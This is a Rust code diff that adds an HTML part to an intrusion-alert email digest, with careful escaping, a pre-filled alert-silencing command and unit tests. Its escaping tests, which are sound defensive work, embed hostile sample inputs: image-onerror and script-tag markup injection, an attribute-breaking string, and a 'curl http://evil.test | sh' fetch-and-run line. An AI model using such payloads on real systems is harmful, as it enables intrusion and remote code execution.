@@ -36,10 +36,19 @@
 //!   built from host names (which come from the operator's own peer
 //!   manifest) and counts. This is what makes header injection
 //!   structurally impossible rather than filtered-for.
-//! - **Body fields are sanitised and capped.** Control characters
-//!   become spaces, lengths are bounded, and the body is `text/plain`
-//!   with no HTML, so a crafted `rationale` cannot render as anything
-//!   but text.
+//! - **Body fields are sanitised, capped, and escaped.** Control
+//!   characters become spaces and lengths are bounded before anything
+//!   is composed. The message goes out as `multipart/alternative`, so
+//!   the HTML part has to withstand a hostile `rationale` on its own:
+//!   every interpolated value passes through [`esc`], and the order is
+//!   load-bearing — sanitise and cap *first*, escape *second*. The
+//!   other way round, a cap can land mid-entity and leave `&amp;`
+//!   truncated to a bare `&am`.
+//! - **The HTML references no remote resource** — no image, stylesheet
+//!   or font, and every style is inline. A remote fetch here would tell
+//!   whoever serves it the moment an operator opened an alert about a
+//!   compromise, which is a signal worth denying an attacker who has
+//!   some influence over what the message contains.
 //!
 //! Detail *is* included in the body, unlike the webhook case, and the
 //! distinction is deliberate: a webhook body traverses a third-party
@@ -55,6 +64,9 @@ use std::path::{Path, PathBuf};
 use anyhow::{Context, Result, bail};
 use bowery_proto::Alert;
 use serde::{Deserialize, Serialize};
+
+use lettre::Message;
+use lettre::message::{MultiPart, SinglePart, header};
 
 use crate::peers::Manifest;
 use crate::virustotal::Verdict;
@@ -459,7 +471,17 @@ pub fn body(hosts: &[HostAlerts], vt: &VerdictMap) -> String {
     let _ = writeln!(out, "{total} new alert(s) from the Bowery mesh.\n");
 
     for host in hosts.iter().filter(|h| !h.alerts.is_empty()) {
-        let _ = writeln!(out, "== {} ({} alert(s))", host.host, host.alerts.len());
+        let _ = writeln!(
+            out,
+            "== {} ({} alert(s)){}",
+            host.host,
+            host.alerts.len(),
+            host.alerts
+                .first()
+                .and_then(|a| fingerprint_hex(&a.originator_fp))
+                .map(|fp| format!("  fp={fp}"))
+                .unwrap_or_default()
+        );
         for a in host.alerts.iter().take(MAX_ENUMERATED) {
             let _ = writeln!(out);
             let _ = writeln!(
@@ -480,6 +502,13 @@ pub fn body(hosts: &[HostAlerts], vt: &VerdictMap) -> String {
             );
             let _ = writeln!(out, "  when      : {}", format_ts(a.ts_unix_ms));
             let _ = writeln!(out, "  episode   : {}", sanitize(&a.episode_id, FIELD_CAP));
+            // The rule is what a silence is written against; the episode
+            // is only the handle used to look it up. Leaving it out meant
+            // an operator could not tell what a silence would cover
+            // without first going back to the agent to ask.
+            if !a.rule_id.is_empty() {
+                let _ = writeln!(out, "  rule      : {}", sanitize(&a.rule_id, FIELD_CAP));
+            }
             if !a.exe_path.is_empty() {
                 let _ = writeln!(out, "  exe       : {}", sanitize(&a.exe_path, FIELD_CAP));
             }
@@ -524,6 +553,7 @@ pub fn body(hosts: &[HostAlerts], vt: &VerdictMap) -> String {
         let _ = writeln!(out);
     }
 
+    out.push_str(SILENCE_HELP_TEXT);
     out.push_str(
         "\n--\nFields above come from the monitored host and are\n\
          attacker-influenceable; treat them as leads, not facts.\n\
@@ -532,6 +562,341 @@ pub fn body(hosts: &[HostAlerts], vt: &VerdictMap) -> String {
          \nSent by `bowery notify`. Nothing was stored off-host.\n",
     );
     out
+}
+
+// ---------------------------------------------------------------------------
+// HTML rendering
+//
+// The plain-text part above stays the fallback and is what `--dry-run`
+// prints. This is what a real mail client shows.
+// ---------------------------------------------------------------------------
+
+/// Escape a value for interpolation into the HTML body.
+///
+/// The text part can lean on [`sanitize`] alone, because plain text has
+/// no structure to forge once the line breaks are gone. HTML does, and
+/// every field interpolated below is attacker-influenced — an
+/// `exe_path` is whatever somebody managed to execute, so a file named
+/// `<img src=x onerror=…>` would otherwise reach the operator's mail
+/// client as markup rather than as the finding it is evidence of.
+///
+/// Escapes all five XML entities rather than the three that suffice for
+/// element text: these values also land in attribute position, where a
+/// bare quote ends the attribute and starts a new one.
+#[must_use]
+pub fn esc(s: &str) -> String {
+    let mut out = String::with_capacity(s.len() + 16);
+    for c in s.chars() {
+        match c {
+            '&' => out.push_str("&amp;"),
+            '<' => out.push_str("&lt;"),
+            '>' => out.push_str("&gt;"),
+            '"' => out.push_str("&quot;"),
+            '\'' => out.push_str("&#39;"),
+            _ => out.push(c),
+        }
+    }
+    out
+}
+
+/// Sanitise, cap, then escape — in that order, which is load-bearing.
+///
+/// Escaping first would let the cap land inside an entity and truncate
+/// `&amp;` to `&am`, which is both wrong on the page and a way to slip
+/// a stray `&` past a reader.
+fn field(s: &str, cap: usize) -> String {
+    esc(&sanitize(s, cap))
+}
+
+/// Full hex fingerprint of an agent, or `None` if it is not 32 bytes.
+///
+/// This is what `--agent-fp` wants, which is what makes the silence
+/// command in the message runnable rather than a shape to fill in.
+#[must_use]
+pub fn fingerprint_hex(fp: &[u8]) -> Option<String> {
+    let arr: [u8; 32] = fp.try_into().ok()?;
+    Some(bowery_crypto::Fingerprint::from_bytes(arr).to_hex())
+}
+
+/// Left rule colour of an alert card. Suspicion is the one number an
+/// operator scans for, so it gets encoded twice — as text and as the
+/// only colour on the card.
+fn severity_color(suspicion: f32) -> &'static str {
+    if suspicion >= 0.8 {
+        "#b3261e"
+    } else if suspicion >= 0.5 {
+        "#b26a00"
+    } else {
+        "#5f6368"
+    }
+}
+
+const MONO: &str = "font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace";
+const SANS: &str =
+    "font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif";
+
+/// Shown once per digest rather than once per alert: the command shape
+/// is identical every time and only the episode id changes.
+const SILENCE_HELP_TEXT: &str = concat!(
+    "\nTo silence one of these across the mesh, take its episode id above:\n\n",
+    "  bowery alerts silence <episode> \\\n",
+    "      --reason \"<why this is benign>\" --fanout \\\n",
+    "      --agent-addr <addr> --agent-fp <fp> --agent-pubkey-b64 <key> \\\n",
+    "      --operator-key <path> --cluster-id <cluster>\n\n",
+    "The episode id is only the handle. What gets signed is the rule, the\n",
+    "binary's hash and the path that alert stands for — the episode itself\n",
+    "never recurs. Add --weight 0.5 to damp rather than silence, and\n",
+    "`bowery alerts unsilence <id>` undoes it.\n",
+);
+
+/// One `label / value` row inside an alert card.
+fn row(out: &mut String, label: &str, value: &str, mono: bool) {
+    use std::fmt::Write as _;
+    let style = if mono {
+        format!("{MONO};font-size:13px;word-break:break-all")
+    } else {
+        "font-size:13px".to_string()
+    };
+    let _ = write!(
+        out,
+        "<tr><td style=\"color:#5f6368;font-size:12px;padding:2px 10px 2px 0;\
+         vertical-align:top;white-space:nowrap\">{label}</td>\
+         <td style=\"{style};padding:2px 0;vertical-align:top\">{value}</td></tr>"
+    );
+}
+
+/// Suspicion, the rule that produced it, and when.
+///
+/// A table rather than a `float`, which is among the first properties a
+/// mail client drops.
+fn card_header(a: &Alert) -> String {
+    format!(
+        "<table style=\"border-collapse:collapse;width:100%;margin-bottom:8px\"><tr>\
+         <td style=\"padding:0;vertical-align:baseline\">\
+         <span style=\"font-size:16px;font-weight:600;color:{}\">{:.2}</span>\
+         <span style=\"{MONO};font-size:13px;margin-left:10px\">{}</span></td>\
+         <td style=\"padding:0;text-align:right;color:#5f6368;font-size:12px;\
+         white-space:nowrap;vertical-align:baseline\">{}</td></tr></table>",
+        severity_color(a.suspicion),
+        a.suspicion,
+        field(&a.rule_id, FIELD_CAP),
+        esc(&format_ts(a.ts_unix_ms))
+    )
+}
+
+/// The quorum verdict, when there is one. Confirmed and not-confirmed
+/// are different enough to deserve different weight on the page; empty
+/// when no round ran, because a missing verdict is not a negative one.
+fn confirmation_badge(a: &Alert) -> String {
+    let Some(c) = a.confirmation else {
+        return String::new();
+    };
+    let (bg, fg, text) = if c.confirmed {
+        (
+            "#fce8e6",
+            "#b3261e",
+            format!(
+                "CONFIRMED — {}/{} peers have no record of this binary",
+                c.peers_unseen, c.peers_asked
+            ),
+        )
+    } else {
+        (
+            "#f1f3f4",
+            "#5f6368",
+            format!(
+                "not confirmed — {}/{} unseen, {} refused",
+                c.peers_unseen, c.peers_asked, c.peers_refused
+            ),
+        )
+    };
+    format!(
+        "<div style=\"background:{bg};color:{fg};font-size:12px;font-weight:600;\
+         padding:5px 8px;border-radius:4px;margin-bottom:8px\">{}</div>",
+        esc(&text)
+    )
+}
+
+/// The episode id and a silence command with the alert-specific parts
+/// already filled in.
+///
+/// Its own block because hunting the id out of a wrapped wall of text
+/// and retyping a 64-hex fingerprint is what made quieting a recurring
+/// false positive something nobody did from a phone.
+fn silence_block(a: &Alert) -> String {
+    use std::fmt::Write as _;
+    let ep = field(&a.episode_id, FIELD_CAP);
+    let mut out = format!(
+        "<div style=\"background:#f8f9fa;border-radius:4px;padding:8px 10px;margin-top:10px\">\
+         <div style=\"color:#5f6368;font-size:11px;text-transform:uppercase;\
+         letter-spacing:.4px;margin-bottom:3px\">episode id — the handle to silence this</div>\
+         <div style=\"{MONO};font-size:13px;word-break:break-all;user-select:all\">{ep}</div>"
+    );
+    if let Some(fp) = fingerprint_hex(&a.originator_fp) {
+        // Everything alert-specific, filled in; the rest is identical on
+        // every invocation and lives in the operator's shell history.
+        //
+        // The reason is deliberately a placeholder a shell will *reject*
+        // rather than one it would accept. Pasted unedited,
+        // `<why this is benign>` is a redirect and fails; a `…` would
+        // have signed a fleet-wide silence whose justification reads as
+        // an ellipsis, and the CLI demands a reason precisely so whoever
+        // finds it later can decide whether to revoke it.
+        let _ = write!(
+            out,
+            "<div style=\"margin-top:8px\">\
+             <div style=\"color:#5f6368;font-size:11px;margin-bottom:3px\">\
+             plus your usual --operator-key / --agent-addr / --agent-pubkey-b64 \
+             / --cluster-id</div>\
+             <div style=\"{MONO};font-size:11px;color:#3c4043;word-break:break-all;\
+             user-select:all\">bowery alerts silence {ep} --agent-fp {} \
+             --reason &quot;&lt;why this is benign&gt;&quot; --fanout</div></div>",
+            esc(&fp)
+        );
+    }
+    out.push_str("</div>");
+    out
+}
+
+fn alert_card(a: &Alert, vt: &VerdictMap) -> String {
+    use std::fmt::Write as _;
+    let mut out = String::new();
+
+    let _ = write!(
+        out,
+        "<div style=\"border:1px solid #dadce0;border-left:4px solid {};\
+         border-radius:6px;padding:12px 14px;margin:0 0 12px\">",
+        severity_color(a.suspicion)
+    );
+
+    out.push_str(&card_header(a));
+
+    out.push_str(&confirmation_badge(a));
+
+    out.push_str("<table style=\"border-collapse:collapse;width:100%\">");
+    if !a.exe_path.is_empty() {
+        row(&mut out, "exe", &field(&a.exe_path, FIELD_CAP), true);
+    }
+    if !a.exe_sha256_hex.is_empty() {
+        // Linkified only when it really is a hash. The escape would
+        // hold either way, but a URL built from an unvalidated field is
+        // the kind of thing that stops holding after a later edit.
+        let sha = field(&a.exe_sha256_hex, FIELD_CAP);
+        let value = if a.exe_sha256_hex.len() == 64
+            && a.exe_sha256_hex.bytes().all(|b| b.is_ascii_hexdigit())
+        {
+            format!(
+                "<a href=\"https://www.virustotal.com/gui/file/{sha}\" \
+                 style=\"color:#1a73e8;text-decoration:none\">{sha}</a>"
+            )
+        } else {
+            sha
+        };
+        row(&mut out, "sha256", &value, true);
+    }
+    if let Some(v) = vt.get(&a.exe_sha256_hex.to_ascii_lowercase()) {
+        row(
+            &mut out,
+            "virustotal",
+            &field(&v.summary(), FIELD_CAP),
+            false,
+        );
+    }
+    row(&mut out, "why", &field(&a.rationale, RATIONALE_CAP), false);
+    for attr in &a.context {
+        row(
+            &mut out,
+            &field(&attr.key, 16),
+            &field(&attr.value, CONTEXT_CAP),
+            true,
+        );
+    }
+    out.push_str("</table>");
+
+    out.push_str(&silence_block(a));
+    out.push_str("</div>");
+    out
+}
+
+/// The `text/html` alternative. Same content as [`body`], laid out for
+/// a client that can render more than 78 columns.
+#[must_use]
+pub fn body_html(hosts: &[HostAlerts], vt: &VerdictMap) -> String {
+    use std::fmt::Write as _;
+    let mut out = String::new();
+    let total: usize = hosts.iter().map(|h| h.alerts.len()).sum();
+
+    let _ = write!(
+        out,
+        "<div style=\"{SANS};font-size:14px;line-height:1.5;color:#202124;max-width:860px\">\
+         <p style=\"margin:0 0 16px\"><strong>{total}</strong> new alert(s) from the \
+         Bowery mesh.</p>"
+    );
+
+    for host in hosts.iter().filter(|h| !h.alerts.is_empty()) {
+        let _ = write!(
+            out,
+            "<h2 style=\"font-size:15px;margin:20px 0 10px;padding-bottom:4px;\
+             border-bottom:1px solid #dadce0\">{}<span style=\"font-weight:400;\
+             color:#5f6368\"> — {} alert(s)</span></h2>",
+            field(&host.host, FIELD_CAP),
+            host.alerts.len()
+        );
+        for a in host.alerts.iter().take(MAX_ENUMERATED) {
+            out.push_str(&alert_card(a, vt));
+        }
+        if host.alerts.len() > MAX_ENUMERATED {
+            let _ = write!(
+                out,
+                "<p style=\"color:#5f6368;margin:0 0 12px\">… and {} more, not listed.</p>",
+                host.alerts.len() - MAX_ENUMERATED
+            );
+        }
+    }
+
+    let _ = write!(
+        out,
+        "<div style=\"border-top:1px solid #dadce0;margin-top:20px;padding-top:12px;\
+         color:#5f6368;font-size:12px\">\
+         <p style=\"margin:0 0 8px\">Fields above come from the monitored host and are \
+         attacker-influenceable; treat them as leads, not facts. Verify against the \
+         signed source with <code style=\"{MONO}\">bowery alerts tail</code>.</p>\
+         <p style=\"margin:0 0 8px\">Silencing signs the rule, the binary's hash and the \
+         path an alert stands for — not the episode, which never recurs. \
+         <code style=\"{MONO}\">--weight 0.5</code> damps instead of silencing, and \
+         <code style=\"{MONO}\">bowery alerts unsilence &lt;id&gt;</code> undoes it.</p>\
+         <p style=\"margin:0\">Sent by <code style=\"{MONO}\">bowery notify</code>. \
+         Nothing was stored off-host.</p></div></div>"
+    );
+    out
+}
+
+/// Both renderings of one digest, plus whatever `VirusTotal` held back.
+///
+/// Returned together so the two parts of a `multipart/alternative` can
+/// never drift into saying different things — the whole point of the
+/// alternative is that a client picks one and the operator is not told
+/// which.
+fn compose(hosts: &[HostAlerts], vt: &VerdictMap, held_back: Option<&str>) -> (String, String) {
+    let text = format!(
+        "{}{}",
+        body(hosts, vt),
+        held_back
+            .map(|l| format!("\n{l}\nHeld-back alerts remain readable with `bowery alerts`.\n"))
+            .unwrap_or_default()
+    );
+    let html = format!(
+        "{}{}",
+        body_html(hosts, vt),
+        held_back
+            .map(|l| format!(
+                "<p style=\"{SANS};font-size:12px;color:#5f6368\">{}<br>Held-back alerts \
+                 remain readable with <code style=\"{MONO}\">bowery alerts</code>.</p>",
+                esc(l)
+            ))
+            .unwrap_or_default()
+    );
+    (text, html)
 }
 
 /// Collapse alerts that supersede each other, keeping the newest.
@@ -664,6 +1029,9 @@ pub struct RunArgs {
     pub manifest_path: PathBuf,
     pub cursor_path: PathBuf,
     pub dry_run: bool,
+    /// Write the HTML alternative here as well as (or instead of)
+    /// sending it.
+    pub html_out: Option<PathBuf>,
 }
 
 /// Poll every agent in the manifest, and email whatever is new.
@@ -758,24 +1126,25 @@ pub async fn run(args: &RunArgs) -> Result<()> {
     }
 
     let subject = subject(&hosts, &verdicts);
-    let body = format!(
-        "{}{}",
-        body(&hosts, &verdicts),
-        vt.line()
-            .map(|l| format!("\n{l}\nHeld-back alerts remain readable with `bowery alerts`.\n"))
-            .unwrap_or_default()
-    );
+    let (body, html) = compose(&hosts, &verdicts, vt.line().as_deref());
+
+    if let Some(path) = &args.html_out {
+        fs::write(path, &html)
+            .with_context(|| format!("writing HTML preview to {}", path.display()))?;
+        println!("notify: wrote HTML preview to {}", path.display());
+    }
 
     if args.dry_run {
         println!("--- would send ---");
         println!("To: {}", cfg.email.to.join(", "));
         println!("Subject: {subject}");
         println!("\n{body}");
+        println!("--- html alternative ({} bytes) ---", html.len());
         println!("--- cursors NOT advanced (dry run) ---");
         return Ok(());
     }
 
-    send_email(&cfg, &subject, &body).await?;
+    send_email(&cfg, &subject, &body, &html).await?;
 
     // Only now. A cursor advanced before a successful send would drop
     // the alerts on the floor: the inbox has already handed them over,
@@ -886,12 +1255,13 @@ async fn screen_with_virustotal(
     (outcome, verdicts)
 }
 
-async fn send_email(cfg: &NotifyConfig, subject: &str, body: &str) -> Result<()> {
-    use lettre::transport::smtp::authentication::Credentials;
-    use lettre::{AsyncSmtpTransport, AsyncTransport, Message, Tokio1Executor, message::header};
-
-    let password = cfg.password()?;
-
+/// Build the `multipart/alternative` message.
+///
+/// Separate from sending so the part order can be asserted: a client
+/// picks the **last** alternative it understands, so the plain part
+/// coming first is the whole reason the HTML is the one that renders.
+/// Flip them and every client silently shows the text version.
+fn compose_message(cfg: &NotifyConfig, subject: &str, text: &str, html: &str) -> Result<Message> {
     let mut builder = Message::builder()
         .from(
             cfg.email
@@ -899,14 +1269,35 @@ async fn send_email(cfg: &NotifyConfig, subject: &str, body: &str) -> Result<()>
                 .parse()
                 .with_context(|| format!("parsing [email] from = {:?}", cfg.email.from))?,
         )
-        .subject(subject)
-        .header(header::ContentType::TEXT_PLAIN);
+        .subject(subject);
     for to in &cfg.email.to {
         builder = builder.to(to
             .parse()
             .with_context(|| format!("parsing recipient {to:?}"))?);
     }
-    let email = builder.body(body.to_string())?;
+    // The text part is not a stub — it is the whole digest, so a client
+    // that refuses HTML loses formatting and nothing else.
+    Ok(builder.multipart(
+        MultiPart::alternative()
+            .singlepart(
+                SinglePart::builder()
+                    .header(header::ContentType::TEXT_PLAIN)
+                    .body(text.to_string()),
+            )
+            .singlepart(
+                SinglePart::builder()
+                    .header(header::ContentType::TEXT_HTML)
+                    .body(html.to_string()),
+            ),
+    )?)
+}
+
+async fn send_email(cfg: &NotifyConfig, subject: &str, text: &str, html: &str) -> Result<()> {
+    use lettre::transport::smtp::authentication::Credentials;
+    use lettre::{AsyncSmtpTransport, AsyncTransport, Tokio1Executor};
+
+    let password = cfg.password()?;
+    let email = compose_message(cfg, subject, text, html)?;
 
     let creds = Credentials::new(cfg.email.username.clone(), password);
     let transport: AsyncSmtpTransport<Tokio1Executor> = if cfg.email.starttls {
@@ -1076,6 +1467,286 @@ mod tests {
             chained.chars().count()
         );
         assert!(!sanitize(&chained, RATIONALE_CAP).contains('…'));
+    }
+
+    // -----------------------------------------------------------------
+    // The HTML alternative
+    // -----------------------------------------------------------------
+
+    /// The invariant this feature replaced. Before HTML, "the body is
+    /// text/plain" was what made a crafted `rationale` unable to render
+    /// as anything but text. Now the escaping is the only thing holding
+    /// that line, so it gets a test naming the payload it must defuse.
+    #[test]
+    fn a_crafted_field_cannot_render_as_markup() {
+        let mut a = alert("ep-1", 0.9, false);
+        a.exe_path = "/tmp/<img src=x onerror=alert(1)>".into();
+        a.rationale = "closes the card </div><script>fetch('//evil.test')</script>".into();
+        a.rule_id = "rule\" onmouseover=\"steal()".into();
+        a.context = vec![bowery_proto::Attribute {
+            key: "argv".into(),
+            value: "sh -c '<b>curl</b> http://evil.test | sh'".into(),
+        }];
+        let hosts = vec![HostAlerts {
+            host: "otter1".into(),
+            alerts: vec![a],
+        }];
+        let html = body_html(&hosts, &VerdictMap::new());
+
+        // No payload may reach the document in a form that opens a tag
+        // or closes an attribute. `onerror=` on its own is harmless once
+        // the `<` is an entity, so what is asserted is that the raw
+        // sequence never appears — not that the words don't.
+        for raw in [
+            "/tmp/<img src=x onerror=alert(1)>",
+            "</div><script>",
+            "rule\" onmouseover=\"steal()",
+            "<b>curl</b>",
+        ] {
+            assert!(!html.contains(raw), "{raw:?} reached the body unescaped");
+        }
+        for tag in ["<img", "<script", "<b>"] {
+            assert!(!html.contains(tag), "{tag:?} was formed from alert text");
+        }
+        // And the operator still gets to read what happened.
+        assert!(html.contains("&lt;img src=x onerror=alert(1)&gt;"));
+        assert!(html.contains("&lt;script&gt;"));
+        assert!(html.contains("&quot; onmouseover=&quot;"));
+    }
+
+    /// Sanitise-then-escape, not the reverse. Capping an already-escaped
+    /// string can cut an entity in half, which puts a bare `&` on the
+    /// page and silently corrupts the tail of the value.
+    #[test]
+    fn capping_never_severs_an_escape_sequence() {
+        // Every character expands to an entity, so an escape-then-cap
+        // implementation is guaranteed to cut one.
+        let out = field(&"<".repeat(4096), 64);
+        assert_eq!(out.matches("&lt;").count(), 64, "64 values, whole: {out}");
+        let tail = out.trim_end_matches(|c: char| c != ';');
+        assert!(tail.ends_with(';'), "no half-written entity: {out}");
+        assert!(!out.contains("&l;") && !out.contains("&am"), "{out}");
+    }
+
+    /// The complaint this work started from: the id an operator needs in
+    /// order to silence an alert has to be in the message they are
+    /// reading, next to a command they can run.
+    #[test]
+    fn html_carries_the_silence_handle_and_the_rule_it_covers() {
+        let hosts = vec![HostAlerts {
+            host: "otter1".into(),
+            alerts: vec![alert("ep-abc123", 0.9, true)],
+        }];
+        let html = body_html(&hosts, &VerdictMap::new());
+        assert!(html.contains("ep-abc123"), "episode id missing");
+        assert!(html.contains("cred.read_netrc"), "rule id missing");
+        assert!(
+            html.contains("bowery alerts silence ep-abc123"),
+            "the runnable command is the point: {html}"
+        );
+        assert!(
+            html.contains(&format!("--agent-fp {}", "ab".repeat(32))),
+            "the command must name the host that raised it"
+        );
+
+        // The text part is the fallback for the same message, so it
+        // cannot be missing what the HTML has.
+        let text = body(&hosts, &VerdictMap::new());
+        assert!(text.contains("ep-abc123"));
+        assert!(text.contains("cred.read_netrc"));
+        assert!(text.contains("bowery alerts silence"));
+        assert!(text.contains(&format!("fp={}", "ab".repeat(32))));
+    }
+
+    /// A remote fetch in an alert mail tells whoever serves it when the
+    /// operator opened it — and the alert may be about that person.
+    #[test]
+    fn the_html_fetches_nothing_when_rendered() {
+        let mut a = alert("ep-1", 0.9, true);
+        a.exe_path = "/tmp/x".into();
+        let hosts = vec![HostAlerts {
+            host: "otter1".into(),
+            alerts: vec![a],
+        }];
+        let html = body_html(&hosts, &VerdictMap::new());
+        for forbidden in [
+            "<img",
+            "src=",
+            "@import",
+            "background-image",
+            "<link",
+            "url(",
+        ] {
+            assert!(!html.contains(forbidden), "{forbidden:?} would fetch");
+        }
+        // The one outbound URL is a link the operator chooses to click.
+        assert_eq!(html.matches("href=").count(), 1);
+        assert!(!html.contains("http://"), "no cleartext URL");
+    }
+
+    /// The `VirusTotal` link is built by concatenating a field into a
+    /// URL. Escaping holds it today; validating the shape keeps it
+    /// holding after the next edit.
+    #[test]
+    fn only_a_real_hash_becomes_a_virustotal_link() {
+        let mut a = alert("ep-1", 0.9, false);
+        a.exe_sha256_hex = "not-a-hash/../../evil".into();
+        let hosts = vec![HostAlerts {
+            host: "h".into(),
+            alerts: vec![a],
+        }];
+        let html = body_html(&hosts, &VerdictMap::new());
+        assert!(!html.contains("href="), "unhashlike value must not linkify");
+        assert!(html.contains("not-a-hash"), "but must still be shown");
+    }
+
+    /// The help block is meant to be pasted. It shipped once with a
+    /// blank line after every `\` continuation, which a shell joins into
+    /// an empty argument and then treats the remainder as separate
+    /// commands — so the "copy this" text ran `bowery alerts silence`
+    /// with no flags and `--agent-addr` as a command of its own.
+    #[test]
+    fn the_pasteable_command_is_one_shell_invocation() {
+        let lines: Vec<&str> = SILENCE_HELP_TEXT.lines().collect();
+        let mut sawcont = false;
+        for (i, l) in lines.iter().enumerate() {
+            if !l.trim_end().ends_with('\\') {
+                continue;
+            }
+            sawcont = true;
+            let next = lines.get(i + 1).copied().unwrap_or("");
+            assert!(
+                !next.trim().is_empty(),
+                "line {i} continues onto a blank line, which breaks the paste:\n{SILENCE_HELP_TEXT}"
+            );
+        }
+        assert!(sawcont, "the command is expected to span lines");
+        assert!(SILENCE_HELP_TEXT.contains("--fanout"));
+        // A reason a shell will reject beats one it would accept: pasted
+        // unedited, this must not sign a silence justified by nothing.
+        assert!(SILENCE_HELP_TEXT.contains("<why this is benign>"));
+    }
+
+    /// Unbalanced tags are what a template edit breaks, and a mail
+    /// client will not tell you — it renders the wreckage. Checked over
+    /// a digest that exercises every optional branch, since an
+    /// `if`-guarded block is where a stray `</div>` hides.
+    #[test]
+    fn every_tag_the_html_opens_is_closed() {
+        let mut confirmed = alert("ep-1", 0.9, true);
+        confirmed.context = vec![bowery_proto::Attribute {
+            key: "argv".into(),
+            value: "sh -c whoami".into(),
+        }];
+        let mut bare = alert("ep-2", 0.4, false);
+        bare.exe_path = String::new();
+        bare.exe_sha256_hex = String::new();
+        bare.rule_id = String::new();
+        bare.originator_fp = vec![0u8; 7]; // malformed: no silence command
+        let mut unconfirmed = alert("ep-3", 0.6, false);
+        unconfirmed.confirmation = Some(AlertConfirmation {
+            peers_asked: 3,
+            peers_unseen: 1,
+            peers_seen: 1,
+            peers_no_reply: 1,
+            peers_refused: 0,
+            quorum: 2,
+            confirmed: false,
+        });
+        let hosts = vec![HostAlerts {
+            host: "otter1".into(),
+            alerts: vec![confirmed, bare, unconfirmed],
+        }];
+        let mut vt = VerdictMap::new();
+        vt.insert(
+            "ab".repeat(32),
+            Verdict::Malicious {
+                malicious: 3,
+                total: 70,
+            },
+        );
+        let html = body_html(&hosts, &vt);
+
+        let mut stack: Vec<&str> = Vec::new();
+        let mut rest = html.as_str();
+        while let Some(lt) = rest.find('<') {
+            rest = &rest[lt + 1..];
+            let end = rest.find('>').expect("every tag is closed with >");
+            let (tag, after) = rest.split_at(end);
+            rest = &after[1..];
+            let name = tag
+                .trim_start_matches('/')
+                .split([' ', '\n'])
+                .next()
+                .unwrap_or("");
+            if tag.starts_with('/') {
+                assert_eq!(
+                    stack.pop(),
+                    Some(name),
+                    "</{name}> does not close the open element"
+                );
+            } else if name != "br" {
+                stack.push(name);
+            }
+        }
+        assert!(stack.is_empty(), "left open: {stack:?}");
+    }
+
+    /// A client renders the **last** alternative it understands, so the
+    /// plain part must come first or the HTML never shows. Also pins the
+    /// charset: the digest is full of em dashes, and a part that lost
+    /// its `utf-8` would arrive as mojibake with nothing failing.
+    #[test]
+    fn the_html_is_the_alternative_a_client_will_pick() {
+        let cfg: NotifyConfig = toml::from_str(
+            r#"
+[email]
+to        = ["op@example.test"]
+from      = "bowery@example.test"
+smtp_host = "smtp.example.test"
+smtp_port = 587
+username  = "bowery@example.test"
+password_file = "/dev/null"
+"#,
+        )
+        .expect("fixture config parses");
+        let msg = compose_message(
+            &cfg,
+            "bowery: 1 alert",
+            "0.92 — text\n",
+            "<div>0.92 — html</div>",
+        )
+        .expect("message builds");
+        let wire = String::from_utf8(msg.formatted()).expect("message is utf-8");
+
+        let plain = wire.find("text/plain").expect("a text part");
+        let rich = wire.find("text/html").expect("an html part");
+        assert!(plain < rich, "plain must precede html:\n{wire}");
+        assert_eq!(
+            wire.matches("charset=utf-8").count(),
+            2,
+            "both parts:\n{wire}"
+        );
+        assert!(wire.contains("multipart/alternative"));
+        // The em dash survives as quoted-printable UTF-8, not as `?`.
+        assert!(wire.contains("=E2=80=94"), "em dash mangled:\n{wire}");
+        // Alert text must not have reached a header.
+        let headers = &wire[..wire.find("\r\n\r\n").unwrap_or(wire.len())];
+        assert!(!headers.contains("0.92"), "body leaked into headers");
+    }
+
+    /// A flood must not become a megabyte of HTML either.
+    #[test]
+    fn html_truncates_a_flood_the_same_way_the_text_does() {
+        let hosts = vec![HostAlerts {
+            host: "otter1".into(),
+            alerts: (0..MAX_ENUMERATED + 7)
+                .map(|i| alert(&format!("ep-{i}"), 0.9, false))
+                .collect(),
+        }];
+        let html = body_html(&hosts, &VerdictMap::new());
+        assert!(html.contains("and 7 more, not listed"));
+        assert!(!html.contains("ep-30"), "past the cap must not render");
     }
 
     /// Bounded is not the same as uncapped. The rationale embeds strings
